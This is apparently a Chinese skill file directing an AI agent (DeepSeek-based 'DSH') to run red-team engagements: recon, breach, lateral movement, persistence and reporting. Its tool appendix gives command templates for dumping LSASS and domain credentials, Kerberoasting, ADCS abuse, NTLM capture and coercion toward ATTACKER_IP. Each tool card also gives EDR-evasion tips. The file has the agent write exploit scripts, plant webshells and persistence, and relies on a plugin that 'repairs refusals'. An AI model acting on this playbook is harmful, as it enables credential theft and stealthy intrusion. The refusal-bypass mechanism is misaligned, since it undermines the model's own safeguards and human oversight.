---
name: ad-playbook
description: 攻防评估模式作战手册：Agentic Red Teaming 定位（AEV 持续验证）、阶段编排（侦察/突破/横向/持久化/报告+复测闭环）、防御验证（detection gap）、AI 应用红队（Garak/PyRIT/Promptfoo 工具矩阵）、验证与评分、MITRE ATT&CK 映射、证据收集规范与报告模板。
---

# 攻防评估作战手册

> 本技能随 attack-defense 预设走。
> persona 中的硬规则（底线、证据标准、评分纪律、阶段纪律、负面清单、表达纪律（拒答修复由宿主插件 dsh-refusal-guard 兜底）、claude 逻辑）不在此重复。

## 定位与设计依据

- 2026 主线：Gartner 将 Agentic Red Teaming 列为攻防平台胜负手——本模式即本地 agentic red teaming 编排器。行业坐标与工具锚点见 refs/trends/ad-trends-2025-2026.md。
- 评估形态：AEV（Adversarial Exposure Validation）思路——持续验证暴露面 + 修复复测闭环，不是一次性报告。
- 遵循用户需求指令 + 提供扩展性思路和方向（persona 已写）。

## 权限与数据主线（主观念）

> 主观念锚点：评估围绕**权限与数据主线**自主扩展实施——服务器权限（最高权限/提权）、
> Web 权限（webshell 上传）、数据库权限（SQLi 读写与提权）、严重敏感数据泄露、未授权访问、
> 登录绕过。每阶段向主线目标靠拢，面外发现照常纳入。

| 主线目标 | 作业形态与判定要点 |
|---|---|
| 服务器最高权限 | 提权链验证（suid/内核/服务缺陷/计划任务/组策略）→ whoami/id 级证据（最小影响）；提权只做可行性证明，不破坏服务 |
| Web 权限（webshell 上传） | 上传点→落地路径→可访问性→执行回显（whoami 级）；webshell 用最小无害探针，落地文件与路径登记 residue |
| 内存马 | 仅 Java 系中间件评估场景：注入可行性验证（不残留或登记制登记）；判定要点=过滤链差异/类加载点 |
| 数据库权限 | SQLi 读（库/表/用户哈希）→ 写文件/读文件可行性（OS 层交互只做 whoami 级回显）→ 数据库账号权限枚举 |
| 严重敏感数据泄露 | 数据外带证明最小化（行数/字段名/掩码样本）；完整数据集**不外带不落地**，只登记位置与类型 |
| 未授权 / 登录绕过 | 会话对照重放（带/不带凭证）、接口直调、前端校验绕过（后端是否独立校验） |

**痕迹纪律（主观念红线）**：攻击作业全程**本地记录关键攻击痕迹**（命令/时间戳/产物哈希进
evidence-index），作业结束后**清理目标侧攻击痕迹**（webshell/上传文件/计划任务/账户等）——
清理清单与步骤写入 persistence-registry/residue，由用户确认后执行；先留证后清理，不裸删；
对目标固有数据的删除操作严禁执行，只提示可疑并呈报。**POC 交付**：验证通过的发现直接生成
完整 python 复现脚本（exp/<finding-id>.py）——参数化目标、默认 whoami 级最小影响、
破坏性步骤默认关闭、退出码 0=复现成功——随报告交付客户手动复现。

## 阶段编排

1. 侦察 → 2. 突破 → 3. 横向 → 4. 持久化 → 5. 报告；每阶段只基于上一阶段的**已验证**结果推进。
- 各阶段用 workflow 扇出，子代理分工：侦察组 / 突破验证组 / 横向组 / 报告组。
- 关键发现经独立子代理交叉复核后才进报告。
- 每阶段产出物登记证据索引（哈希 + 时间戳）。
- **持久化阶段定义（persona 硬规则）**：可行性验证 = 真实落地→验证生效→**立即登记**
  `persistence-registry.md`（技术类型 / 落点主机与位置 / 建立时间 / 生效验证证据 /
  **手动排除步骤**——写到照做能拆的程度），**不自动清理**；报告必须附持久化清单，
  detection gap 汇总中每条持久化对应「目标侧是否检测到」。

## 子代理编排

### 角色表

| 角色 | 载体 | 输入 → 输出 | 派工要点 |
|---|---|---|---|
| **总控**（主会话） | — | 目标 → 阶段推进 / 门禁判定 / 产物落盘 / 阶段转换检查点（显式列 gate 清单再进） | 不另设总控子代理；主会话即编排者 |
| 侦察组 | workflow 扇出（per-资产/per-服务） | 授权范围 → `assets.md` + 证据索引 | prompt 只带侦察方法论（pentest-playbook 侦察章 / refs recon 类），**不带利用章** |
| 路径规划员 | 单个 spawn | 侦察产物 → candidate_paths + chosen_path（含放弃理由） | 只给原始侦察材料，不给总控预判 |
| 突破验证组 | workflow（per-路径）或 ralph 试错循环 | chosen_path → 已验证 finding（可复现证据） | ralph 适合「尝试-失败-调整」迭代；速率纪律照常 |
| 横向组 | workflow 扇出 | 已验证突破 + 授权范围 → 横向路径证据 | refs/offensive 横向系 + zh-intranet/ |
| 持久化验证员 | 单个 spawn | 授权明示 → 持久化落地+生效证据+清单登记 | 见上节持久化定义；登记即收工 |
| **防御验证员** | 独立 spawn | 关键 finding → 「目标侧检测到没」+ detection gap 条目 | 本模式独有角色；对照 refs/defense/ir-* 与检测工程篇 |
| 复核员 | 独立 spawn（`independent-review` 技能） | 原始材料（不给主链结论）→ 确认/挑战 + **gate-pass/fail** | 兼任门禁官；关键 finding 先 DSH 独立复核（跨模型复核为建议项，用户触发） |
| 报告员 | spawn | 全部 gate-pass 的 finding → 总报告+六字段+ATT&CK+评分+gap 汇总 | 只收带复核签名与 gate-pass 的条目 |

### 阶段契约与门禁（产物过 gate 才进下一阶段）

| 阶段 | 产物必需字段（落盘 `artifacts/`+`evidence-index.md`） | 通过判据 |
|---|---|---|
| 侦察 | 资产条目（主机/端口/服务）、证据引用 | 无资产或无证据引用 → 不过 |
| 突破 | 路径台账 `paths-ledger.md`（candidate/chosen/终态）、已验证 finding（可复现 PoC/请求包）、复核记录 | 无 chosen_path 或无已验证 finding → 不过；结构校验走 stage_gate breach |
| 横向 | 横向路径证据、范围合规标注 | 无已验证突破作前置 → 不过 |
| 持久化 | persistence-registry.md 登记（含手动排除步骤） | 未登记 → 不过；登记即满足 |
| 报告 | 六字段+ATT&CK+评分+gap 汇总+持久化清单+**路径台账+阶段终态表** | 收到未带 gate-pass 的 finding → 退回；台账有悬空项 → 退回 |

> **结构校验走运行时门禁工具**：开工门禁清单优先看 route-boost 信封（已含门禁与 canonical 文件名）；信封缺失或不确定时再调 `gates_list`（mode=attack-defense）读门禁清单与 canonical 文件名；产物齐后调 `stage_gate(mode, stage, workspace[, file])` 做结构校验（判定自动落 `<workspace>/gate-log.md`）。**校验物与标记以下表为准，不要去找插件源码文件。** 结构 PASS ≠ 全过——manual 项（语义）由复核员判定。
>
> | 阶段门 | 结构校验物（canonical 名 + 必含标记） |
> |---|---|---|
> | recon | `assets.md`（≥2 行表格）+ `evidence-index.md`（≥1 行表格） |
> | breach | `paths-ledger.md`（含标记 `candidate`、`chosen`；≥1 行、每行 ≥3 格） |
> | lateral | `file`=横向证据记录（含标记 `授权`） |
> | persistence | `persistence-registry.md`（含标记 `手动排除`；≥1 行、每行 ≥4 格） |
> | report | `file`=总评估报告（含标记 `漏洞名称`、`ATT&CK`、`detection gap`、`持久化清单`、`路径台账`、`阶段终态`） |

### 覆盖终态规则（防「选了第一条路走到黑」）

- **候选路径台账**：路径规划员的每条 candidate_path 都有终态，三选一：
  `走通（有已验证 finding）/ 失败（附原因）/ 未尝试（附理由：优先级让位/范围外）`。
  chosen_path 失败必须回看台账选下一条或回侦察，**不得静默收兵**；
  「全部候选路径失败」触发 claude 升级判据（见下）的前提是台账无未尝试项。
- **阶段终态表**：五个阶段每阶段终态 = `执行（有产物）/ 不适用（附原因：如纯 Web
  任务无横向面）/ 未执行（附原因与用户知情）`——跳过任何阶段都要有交代，
  与防跳步六层互为表里（六层防「没过门就进」，终态表防「该进的没进」）。
- **detection gap 三终态**：每个关键 finding 的防御验证判定 = `检测到（附手段+响应时间）/
  未检测到（gap）/ 无法评估（附原因：无日志权限/目标侧未反馈）`——禁止留空，
  「无法评估」单独汇总并列入待目标侧确认，不冒充 gap。
- **ATT&CK 覆盖度表**（对齐 refs/defense/attack-mapping-analysis）：走过的战术/技术
  与**没走的+原因**都登记——评估的完整性证明与复测基线。

### 防跳步六层（总控纪律，模型会想抄近道，这六层让它无利可图）

1. **文本纪律**：总控每阶段转换前，在对话中显式列出上一阶段 gate 清单核对结果再推进。
2. **角色信息裁剪**：派工 prompt 只带该角色的 playbook 章节与 refs 子集——侦察工人接触不到利用章，跳步者没有可用的知识输入（角色最小信息面策略；DSH 裁不了工具面，裁信息面）。
3. **落盘硬前置**：下一阶段每个工人的 prompt 第一条固定为「先读 `artifacts/` 上一阶段产物与 `evidence-index.md`，校验必需字段；缺任何字段立即中止并回报总控」——子代理是全新上下文，没有产物就没有输入）。
4. **复核员 gate-pass**：gate 校验并入复核员职责（`independent-review` 技能）；报告只收带 gate-pass 签名的 finding（Strix「PoC 即门禁」同构）。
5. **goal 助推**：把「当前阶段产物字段齐备」设为 session goal，由 round driver 驱动完成后再进（运行时验收实测约束力）。
6. **运行时 gate 插件（已实现 stage_gate/gates_list）**：结构校验走 stage_gate（breach 等 gate）；语义门禁归第 4 层复核员 gate-pass，从纪律变技术强制。

### claude 升级判据（对 persona 兜底链的具体化）

| 触发条件 | 动作 |
|---|---|
| 复核员之间结论不一致 | DSH 追加第三子代理仲裁，仍不一致 → 双方结论并报用户（可建议用户引入 claude 第三方） |
| 计分 finding 定稿 | DSH 独立复核一致即进报告；跨模型复核列为建议项（用户触发后升级可信级） |
| 全部候选路径失败且原因不明 | 建议（用户决定）：claude 独立评估（可能漏了什么），再决定回侦察或收口 |
| 评分或定级有争议 | DSH 追加复核；仍争议 → 按验证等级从严标注（可建议跨 harness 复核） |
| 检测 gap 判定拿不准（不确定是没检测还是没看到日志） | 建议（用户决定）：claude 分析日志可得性，必要时列入「待目标侧确认」而非妄下结论 |

### 防御证据请求清单

- 演练启动时**一次性**向用户索取防御侧证据渠道（避免每个 finding 单独等蓝队）：
  告警导出权限（SIEM/EDR 查询接口或人工导出位置）、日志收集范围、蓝队联络方式与响应 SLA。
- 渠道缺失的部分如实标注「无法评估」，detection gap 三终态（检测到/gap/无法评估）不变。

## 防御验证（detection gap）

- 每个关键发现都要回答：**目标侧检测到了吗？**（日志确认、EDR 告警、蓝队反馈）。
- 检测到：记录检测手段与响应时间；未检测到：标记为 detection gap，单列汇总。
- 与 av-evasion 模式的检测规则回馈对接：**接收** av-evasion 产出的规则候选（YARA/Sigma/遥测指标），用于 gap 判定并产出目标组织防御加固建议（方向固定：av-evasion 产出 → 本模式收口）。

## AI 应用红队（在评估范围内时）

- 对象：目标组织的 LLM 应用、智能体、MCP 生态。
- 攻击面参照 OWASP Agentic Top 10 (2026)：提示注入、越狱、工具滥用、上下文污染。
- 工具矩阵：Garak（单轮）、PyRIT（多轮）、Promptfoo（评测编排）；编排方式 = 单轮+多轮接力（Garak 单轮 → PyRIT 多轮），攻击面先读本模式 refs/ai/ 三篇。
- 发现照常走交叉复核 + 证据标准。

- **预算纪律**：Garak/PyRIT/Promptfoo 每目标默认
  ≤30 轮攻击生成，超预算收口为摘要报告，未覆盖攻击面标「未完成（预算）」。

## 验证与评分

- 评分以证据为准，禁止叙事性定级。
- 等级阶梯：分级写「能走到哪一级」（如：发现→验证→利用→影响），而非单一分数。
- 未验证项标「疑似」且不计入评分。

## MITRE ATT&CK 映射

- 每个 finding 映射战术/技术编号（Txxxx）；汇总出覆盖度表。
- 映射本身也要可复核：写明映射依据（行为→技术）。

## 证据收集与三件套（复用 pentest）

- 残留清单与时间线：登记到工作区 residue.md（测试创建的账号/文件/配置 + 关键操作时间戳），收尾报告并获许可后清理。
- 敏感数据最小化：凭据密钥与报告分离，展示以能证明为度。

## 战果登记（会话隔离，战果清单板式）

- 成果单位=**战果**（拿到了什么，不是漏洞报告）：真实入口点 / 数据读取成果（脱库文件路径）/
  凭据·密码本 / 哈希集(hash map) / 横向立足点 / 域控成果 / Webshell 部署 / 持久化项 / 内网资产 / 检测gap。
- 字段映射：title=战果名、type=战果类型词表、target=目标/位置、severity=权限/价值级别、
  description=内容摘要（凭据数/数据范围/权限级）、chain=获取路径、poc=利用/使用方法、evidence=证据编号。
- 状态=资产语义（待验证/有效·已验证/已失效/已交付）；复核后 `redteam_finding_update` 回写；
  失效战果（凭据轮换后）标「已失效」不删行（保留痕迹）。

## 报告模板

- 报告落盘 reports/：总体评估报告 + 逐 finding 六字段文件；消费 code-audit 静态发现时，待人工验证项汇入 pending-manual.md。
- 附加：ATT&CK 映射、证据索引（哈希+时间戳）、证据化评分与修复优先级、detection gap 汇总。
- 修复复测闭环：修复后按原路径复测，结果回写报告。

- 局限性声明（固定行）：本报告由 AI 多 harness 协作生成（DSH=DeepSeek 主模型；复核通道=claude/codex CLI，后端随各自 CLI 配置），关键结论经 DSH 独立子代理复核后定稿输出；跨 harness 复核作为建议项由用户决定是否追加，仍可能存在模型级盲区——重大决策请结合人工判断。

## 工具手册

### 工具使用策略（总纲）

- **工具平面检测制（与其余模式同构）**：本手册不声称任何工具已装——
  预设面向新环境分发，执行层工具（pentest/code-audit/binary-analysis 的工具卡）同样以
  **开工检测为准**（`command -v` 探测并登记 tool-plane）；缺失走四级兜底。
- **四级兜底（与其余模式同构）**：检测到的本机工具/bash
  优先 → 已连接 MCP 兜底 → **脚本兜底（用户不让装时：python3 优先、shell 次之、
  Windows 写 ps1/bat，落工作区 scripts/ 并登记 tool-plane「脚本代替 <工具>」，先自测再用）**
  → 安装请求兜底（批准后装项目目录、任务结束提醒可卸载）。
- **跨平台（win/mac/linux）**：执行层命令按 pentest/code-audit/binary 手册 + 公约翻译；
  Windows 演练（域渗透/ad 系）用 PowerShell 系命令（BloodHound/Impacket 等有 Windows
  可用形态），证据与哈希按公约跨平台可对。
- **本模式定位**：编排者——执行层**内网工具链见本手册附录 A-2「内网攻防工具速查表」**
  （mimikatz/impacket/NetExec/responder/rubeus/certipy/evil-winrm/coercer 等的六要素卡）；
  Web/侦察类工具复用 pentest 附录，样本逆向复用 binary 附录，免杀载荷复用 av-evasion 附录。
  本手册只写**编排与评估专用**的用法 + 内网工具卡。
- 编排工具：workflow（扇出）、subagent/subagent_fork（分阶段角色）、subagent_claude_code
  （跨模型复核，用户触发）、goal（长任务追踪）、bash 后台任务（长时作业）。

### 阶段速查卡（编排 + 评估专用）

#### 演练规划

- 输出演练方案（目标/阶段/授权范围/窗口），走 plan mode 让用户批准后开工；
  方案结构读 refs/offensive/red-team-engagement.md。
- 阶段子代理分工与证据要求按 persona 五阶段纪律执行。

#### 各阶段执行（工具复用）

- **侦察**：加载 pentest-playbook，用其侦察/资产速查卡与 refs（web/api/zh 等）。
- **突破/横向/提权**：读 refs/offensive/（initial-access/lateral-movement/
  privilege-escalation/active-directory-security/evasion-techniques/c2-infrastructure）；
  执行工具用本手册**附录 A-2 内网工具链**（非 pentest 附录——pentest 附录只有 Web/侦察工具）。
- **社工面**：refs/offensive/phishing-campaign.md、social-engineering.md（授权内）。

#### 防御验证（detection gap）

- 每个关键发现回答「目标侧检测到没」：核对日志/EDR 告警/蓝队反馈；
  「应该留下什么痕迹」读 refs/defense/（triage/forensics/timeline）反向验证。
- 检测到 → 记录手段与响应时间；未检测到 → detection gap 汇总，附检测规则建议
  （可引 av-playbook 检测侧章节产出 YARA/Sigma）。

#### AI 应用红队

- 工具矩阵（补充工具集，检测缺失时按安装请求兜底）：Garak（单轮）/ PyRIT（多轮）/ Promptfoo（评测编排）；
  攻击面与场景优先读本模式 refs/ai/（prompt-injection/jailbreak/agent-safety）；需要联动时再借 pentest/code-audit 的 refs/ai/（生态技能互通）。

#### MITRE ATT&CK 映射与评分

- 无专用 CLI：按「行为 → 战术/技术」手工映射（读 refs/offensive/ 各篇的技战术描述）；
  评分按证据化 + capability ladder（persona）；映射依据写进证据索引。

### 附录 A：编排工具速查（DSH 内置，随预设分发，无环境依赖）

| 工具 | 定位 | 用法要点 |
|---|---|---|
| workflow | 多阶段扇出 | 阶段并行、per-phase 子代理、结构化结果 |
| subagent / subagent_fork | 独立子代理 | 侦察组/验证组/横向组/报告组分工 |
| subagent_claude_code | 跨模型复核 | 建议项制（用户触发）；兜底链见 persona |
| goal | 长任务追踪 | 演练总目标跨轮续接 |
| bash 后台任务 | 长时作业 | 扫描/爆破类长任务 run_in_background |

### 附录 A-2：内网攻防工具速查表（六要素卡）

> 定位：执行层内网工具的结构化卡。**开工探测制**：不声称已装，先 `command -v`/`where` 探测并登记
> tool-plane，缺失走四级兜底（本机工具 → MCP → python/shell 脚本兜底 → 安装请求）。每个工具六要素 =
> 定位 / 安装 / 高频命令模板 / 输出解读 / 速率纪律 / 检测避让+证据留存。跨平台按 win/mac/linux 等价表
> 翻译（域渗透工具多为 Linux(python) + Windows(二进制) 双形态）。深度命令另见 refs 正文。

| 工具 | 定位 | 安装（批准后装项目目录/攻击机） |
|---|---|---|
| mimikatz | Windows 凭证抓取（LSASS/SAM/DPAPI/票据） | 官方二进制（免杀形态另配） |
| impacket（secretsdump/psexec 等） | 域攻防瑞士军刀（DCSync/PTH/横向/中继） | `pip install impacket` |
| NetExec（nxc）/ crackmapexec | 域枚举+横向+模块执行（CME 的活跃 fork） | `pipx install netexec` |
| responder | LLMNR/NBT-NS/mDNS 欺骗 + 认证捕获 | 官方仓库（`pip install responder` 或源码） |
| rubeus | Kerberos 攻击（Roasting/票据/PKINIT） | 官方源码编译（Windows .NET） |
| certipy | ADCS 攻击（ESC 系列） | `pip install certipy-ad` |
| evil-winrm | WinRM 交互 shell（PTH/Kerberos） | `gem install evil-winrm` |
| coercer | 强制认证方法自动枚举（coercion） | `pip install coercer` |
| bloodhound(-ce) | AD 攻击路径图分析 | CE 发行包 + SharpHound 采集器 |
| DPAPI/LSASS 隐蔽工具 | pypykatz/DonPAPI/dploot/nanodump/lsassy/SharpDPAPI | 各自官方仓库（pip/源码/二进制） |

**mimikatz**
- 定位：Windows 本地/域凭证全谱（logonpasswords/dcsync/sam/dpapi/票据）。
- 高频命令：`mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`；`lsadump::dcsync /domain:X /user:krbtgt`；`sekurlsa::minidump lsass.dmp`；`dpapi::cred /in:<blob> /masterkey:<mk>`。
- 输出解读：`sekurlsa` 按 provider 分组——`MSV`(NT/LM 哈希) `Kerberos`(票据/密钥) `WDigest`(明文，若未禁用)。
- 速率纪律：单次抓取即可，不要反复 dump（每次 dump 都是一次 LSASS 访问风险）。
- 检测避让：基础 `sekurlsa` 最易被 EDR 拦，换隐蔽链（comsvcs/nanodump/lsassy/pypykatz，见 refs `lsass-dump-stealth`）。
- 证据留存：哈希/票据掩码 + 命令时间戳 + 产物哈希进 evidence-index。

**impacket（secretsdump / psexec）**
- 定位：DCSync、SAM/NTDS 导出、PTH 横向、NTLM 中继。
- 高频命令：`secretsdump.py DOMAIN/user:pass@TARGET`；`secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`；`secretsdump.py -just-dc DOMAIN/user@DC`；`psexec.py DOMAIN/user:pass@TARGET`。
- 输出解读：`secretsdump` 输出 `<RID>:<账号>:<LM>:<NT>:::` 哈希行 + `$MACHINE.ACC` 机器账户哈希；`-just-dc` 追加 DPAPI backupkey。
- 速率纪律：DCSync 只做一次取全量，勿反复拉取（触发 4662 告警）。
- 检测避让：用 AES Kerberos（`-k -aesKey`）代替明文口令认证；`psexec` 服务名用自定义、用后自删。
- 证据留存：哈希掩码 + 复现命令 + 目标 + 时间戳。

**NetExec（nxc）/ crackmapexec**
- 定位：域内批量枚举（共享/用户/会话）+ 模块化横向与凭据验证。
- 高频命令：`nxc smb 10.10.10.0/24 -u u -p p --shares`；`nxc smb <T> -u u -H <NTHash> -M lsassy`；`nxc winrm <T> -u u -p p -x whoami`。
- 输出解读：命中主机标注 `(Pwn3d!)`（本地管理员）；`--shares` 列出读写权限；`-M lsassy` 输出远程 LSASS 哈希表。
- 速率纪律：`--no-bruteforce` 防误爆；spray 每次少账户多密码、每账户每小时 ≤1 次防锁定；CIDR 分批。
- 检测避让：用 `-k`(Kerberos) 或 `-H`(哈希) 而非明文；避免对 DC 批量 spray。
- 证据留存：命中清单 + 哈希掩码 + 模块输出落盘。

**responder**
- 定位：内网协议欺骗（LLMNR/NBT-NS/mDNS）+ 捕获 NetNTLMv2 哈希。
- 高频命令：`sudo responder -I <网卡>`；`responder -I eth0 -wF`（关 WPAD 减噪）。
- 输出解读：`[+]` 记录捕获的 `NTLMv2-SSP Hash`（可离线 hashcat 5600 或 ntlmrelayx 中继）。
- 速率纪律：只开需要的协议，捕获即收；勿长时间全开（产生大量广播噪声）。
- 检测避让：定位单一网段、关闭 SMB/HTTP 服务器项降指纹；配合 ntlmrelayx 用 `-I` 多网卡分流。
- 证据留存：捕获哈希掩码 + 源主机 + 时间戳。

**rubeus**
- 定位：Kerberos 攻击（Kerberoast/AS-REP/票据注入/委派/PKINIT）。
- 高频命令：`Rubeus.exe kerberoast /outfile:hashes.txt`；`Rubeus.exe asreproast /outfile:asrep.txt`；`Rubeus.exe asktgt /user:x /rc4:HASH /ptt`；`Rubeus.exe harvest /interval:30`。
- 输出解读：`kerberoast` 输出 `$krb5tgs$23$*...`（hashcat 13100）；`asktgt` 成功即注入 TGT。
- 速率纪律：roasting 枚举一次性取全，勿反复 TGS-REQ（4769 告警）。
- 检测避让：`/opsec` 参数降低特征；加密类型控制（`/aes256`）避开 RC4 告警。
- 证据留存：票据哈希掩码 + 命令参数 + 时间戳。

**certipy**
- 定位：ADCS 攻击（ESC 系列枚举与利用、证书认证、Shadow Credentials）。
- 高频命令：`certipy find -u user@domain -p pass -dc-ip DC -vulnerable`；`certipy req ... -template X -upn admin@domain`；`certipy auth -pfx admin.pfx -dc-ip DC`；`certipy shadow auto ...`。
- 输出解读：`find -vulnerable` 列出命中模板与 ESC 编号；`auth` 输出恢复的 NT 哈希（`[+] Got hash for ...`）。
- 速率纪律：枚举一次性，利用按模板逐个确认，不盲打。
- 检测避让：用 `-dc-ip` 直连 DC 减少噪声；证书请求走 HTTPS 端点。
- 证据留存：命中模板 + ESC 编号 + 恢复哈希掩码。

**evil-winrm**
- 定位：WinRM 交互 shell（支持 PTH/Kerberos）。
- 高频命令：`evil-winrm -i TARGET -u user -p pass`；`evil-winrm -i TARGET -u user -H NTHash`。
- 输出解读：成功后进入 PowerShell 交互；`*Evil-WinRM* PS>` 提示符。
- 速率纪律：单会话复用，勿反复登录（4624/4648 日志）。
- 检测避让：优先 Kerberos（`-k`）或哈希，避免明文口令。
- 证据留存：命令回显落盘 + 会话时间戳。

**coercer**
- 定位：自动枚举 Windows 强制认证（coercion）方法。
- 高频命令：`coercer -u user -p pass -d domain -t TARGET --autodetect`；`coercer coerce -t TARGET -l ATTACKER_IP`。
- 输出解读：`[+]` 列出成功触发认证的 RPC 方法（PrinterBug/PetitPotam 等）。
- 速率纪律：每种方法单次触发，勿循环轰炸。
- 检测避让：选需认证的方法降低盲触发噪声；配合 ntlmrelayx 时目标端口精确。
- 证据留存：触发方法 + 捕获哈希掩码 + 时间戳。

**bloodhound(-ce)**
- 定位：AD 攻击路径图分析（ACL/委派/ADCS 边）。
- 高频命令：`SharpHound.exe -c all -d domain.com`；`bloodhound-ce-python -d domain.com -u u -p p -ns DC -c All`。
- 输出解读：JSON 图导入 CE，查最短路径到 DA（`GenericAll`/`WriteDacl`/`RBCD` 边）。
- 速率纪律：`-c DCOnly` 低权限即可，降低采集量；勿全林高频采集。
- 检测避让：用 LDAP 只读采集，单次完成；CE 本地运行。
- 证据留存：攻击路径导出 + 关键边 + 时间戳。

**DPAPI/LSASS 隐蔽工具（pypykatz / DonPAPI / dploot / nanodump / lsassy / SharpDPAPI）**
- 定位：DPAPI 全链解密 + LSASS 隐蔽 dump + 离线解析。
- 高频命令：`pypykatz lsa minidump lsass.dmp`；`DonPAPI.py domain/user:pass@target`；`dploot credentials -u u -p p -d d target`；`nanodump.exe --ssp --write lsass.dmp`；`lsassy -u u -p p -d d target`；`SharpDPAPI.exe credentials`。
- 输出解读：pypykatz 分 provider 输出哈希/票据/DPAPI masterkey；DonPAPI/dploot 输出目标机 DPAPI 凭据明文；lsassy 输出远程哈希表。
- 速率纪律：每台目标单次 dump/解密，勿反复。
- 检测避让：lsassy 远程免落地、nanodump `--ssp` 绕进程监控、pypykatz 全离线（详见 refs `lsass-dump-stealth` / `dpapi-creds`）。
- 证据留存：哈希/凭据掩码 + 工具 + 目标 + 时间戳。

### 附录 B：补充工具集（检测缺失时按安装请求兜底；安装命令按目标机平台自选）

| 工具 | 能力 | 安装方式（批准后装项目目录） |
|---|---|---|
| Garak | LLM 应用单轮攻击测试 | pip install garak |
| PyRIT | LLM 应用多轮红队框架 | pip install pyrit |
| Promptfoo | 评测编排与断言 | npm i -g promptfoo |
| attack-navigator | ATT&CK 映射可视化 | 官方发行包 |

### 附录 C：MCP 兜底清单（已连接时优先）

- kali MCP / burpsuite MCP / yakit MCP / chrome MCP / js-reverse MCP 等；
  产出同样遵守证据标准与速率纪律；工具名与参数以实际注册为准（不虚构）。

### 附录 D：预设内参考案例库（refs/：随预设分发，无任何机器特定路径）

- **位置**：本预设目录下 `refs/`。加载本技能时你会得到本技能的 base 目录
  （SKILL.md 所在目录 = `skills/ad-playbook/`），refs/ 相对它 = `../../refs/`；
  用 read 直接读取，先读 `refs/README.md`（全量索引）。打包/迁移到任何机器路径都有效。

| 需求 | 读 refs/ 下文件 |
|---|---|
| 演练规划 | offensive/red-team-engagement.md |
| 突破/横向/提权/AD/C2 | offensive/ 对应各篇 |
| 规避技术 | offensive/evasion-techniques.md |
| 社工面 | offensive/phishing-campaign.md、social-engineering.md |
| 防御验证（痕迹/取证/时间线） | defense/ 七篇 |
| AI 目标攻击面 | ai/ai-prompt-injection.md、ai/ai-jailbreak-techniques.md、ai/ai-agent-safety.md |
| 内网与域攻防（中文资产） | zh-intranet/ 十二篇（recon/lateral/domain-attacks/privesc/tunneling/credential-theft/password-collection 等） |
| 2025-2026 攻防趋势 | trends/ad-trends-2025-2026.md |
